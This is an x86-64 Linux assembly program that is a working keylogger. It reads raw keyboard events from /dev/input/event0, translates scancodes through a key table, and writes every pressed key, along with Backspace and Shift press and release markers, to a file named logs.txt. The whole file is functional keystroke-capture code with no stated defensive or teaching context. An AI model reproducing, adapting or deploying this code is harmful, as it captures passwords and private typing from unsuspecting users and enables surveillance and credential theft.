.section .rodata
# Table of the keyboard
keys:    
    #Escape key
    .org keys+1
    .byte 0x1B

    .org keys+2
    .byte '1'

    .org keys+3
    .byte '2'

    .org keys+4
    .byte '3'

    .org keys+5
    .byte '4'

    .org keys+6
    .byte '5'

    .org keys+7
    .byte '6'

    .org keys+8
    .byte '7'

    .org keys+9
    .byte '8'

    .org keys+10
    .byte '9'

    .org keys+11
    .byte '0'

    .org keys+12
    .byte '-'

    .org keys+13
    .byte '='

    # Backspace Key
    .org keys+14
    .byte 0x8

    # Tab Key
    .org keys+15
    .byte 0x9

    .org keys+16
    .byte 'q'
    
    .org keys+17
    .byte 'w'

    .org keys+18
    .byte 'e'

    .org keys+19
    .byte 'r'

    .org keys+20
    .byte 't'

    .org keys+21
    .byte 'y'

    .org keys+22
    .byte 'u'

    .org keys+23
    .byte 'i'

    .org keys+24
    .byte 'o'

    .org keys+25
    .byte 'p'

    .org keys+26
    .byte '['

    .org keys+27
    .byte ']'

    .org keys+28
    .byte '\n'
    
    # Null Key
    .org keys+29
    .byte 0x0

    .org keys+30
    .byte 'a'

    .org keys+31
    .byte 's'

    .org keys+32
    .byte 'd'

    .org keys+33
    .byte 'f'

    .org keys+34
    .byte 'g'

    .org keys+35
    .byte 'h'

    .org keys+36
    .byte 'j'

    .org keys+37
    .byte 'k'

    .org keys+38
    .byte 'l'

    .org keys+39
    .byte ';'

    # ' Key
    .org keys+40
    .byte 0x27

    # ` Key
    .org keys+41
    .byte 0x60

    # Shift-in Key
    .org keys+42
    .byte 0xf

    .org keys+43
    .byte '\'

    .org keys+44
    .byte 'z'

    .org keys+45
    .byte 'x'

    .org keys+46
    .byte 'c'

    .org keys+47
    .byte 'v'

    .org keys+48
    .byte 'b'

    .org keys+49
    .byte 'n'

    .org keys+50
    .byte 'm'

    .org keys+51
    .byte ','

    .org keys+52
    .byte '.'

    .org keys+53
    .byte '/'

    # Shift-in Key
    .org keys+54
    .byte 0xf

    .org keys+55
    .byte 0x0
    
    .org keys+56
    .byte 0x0

    # Space Key
    .org keys+57
    .byte 0x20

file: .string "/dev/input/event0"
logs: .string "logs.txt"
backspacePressed: .string "-Backspace key-"
shiftKey: .string "-Shift key "
shiftPressed: .string "was pressed-"
shiftReleased: .string "was released-"

.section .data
    buffer: .skip 256, 0

.section .text

.globl main
.type	main, @function 
main:
    # Enter
    pushq %rbp
    movq %rsp, %rbp  
    pushq %r15
    pushq %r14

    # open the event0 file
    movq $2, %rax
    movq $file, %rdi
    movq $0, %rsi
    movq $0x800, %rdx
    syscall
    movq %rax, %r15

    movq $2, %rax
    movq $logs, %rdi
    movq $65, %rsi
    movq $0400, %rdx
    syscall
    movq %rax, %r14

    mainLoop:
        # read from the event0 file
        movq $0, %rax
        movq %r15, %rdi
        movq $buffer, %rsi
        movq $24, %rdx
        syscall

        # Check what is the type of the event
        movq $buffer, %rbx
        movq %rbx, %rcx
        addq $16, %rcx
        cmpw $1, (%rcx)
        jne mainLoop

        # get the right keyboard key
        movq %rbx, %rsi
        addq $18, %rsi
        movzbq (%rsi), %rsi
        addq $keys, %rsi

        # save the input_event.value in r8
        movq %rbx, %r8
        addq $20, %r8

        # Check if the shift Key was pressed
        cmpb $0xf, (%rsi)
        je ShiftKey

        # Check if the key was pressed or released

        cmpl $0, (%r8)
        je mainLoop


        cmpb $0x8, (%rsi)
        je BackspaceKey

        # write in the logs file
        movq $1, %rax
        movq %r14, %rdi
        movq $1, %rdx
        syscall

        jmp mainLoop

    BackspaceKey:
        movq $1, %rax
        movq %r14, %rdi
        movq $backspacePressed, %rsi
        movq $15, %rdx
        syscall
        jmp mainLoop
    
    ShiftKey:
        movq $1, %rax
        movq %r14, %rdi
        movq $shiftKey, %rsi
        movq $11, %rdx
        syscall

        cmpl $1, (%r8)
        je ShiftPressed
        cmpl $0, (%r8)
        je ShiftReleased

        ShiftPressed:
            movq $1, %rax
            movq %r14, %rdi
            movq $shiftPressed, %rsi
            movq $12, %rdx
            syscall
            jmp mainLoop
        ShiftReleased:
            movq $1, %rax
            movq %r14, %rdi
            movq $shiftReleased, %rsi
            movq $13, %rdx
            syscall
            jmp mainLoop

    popq %r14
    popq %r15
    movq %rbp, %rsp
    popq %rbp
    
    movq $60, %rax
    xorq %rdi, %rdi
    syscall
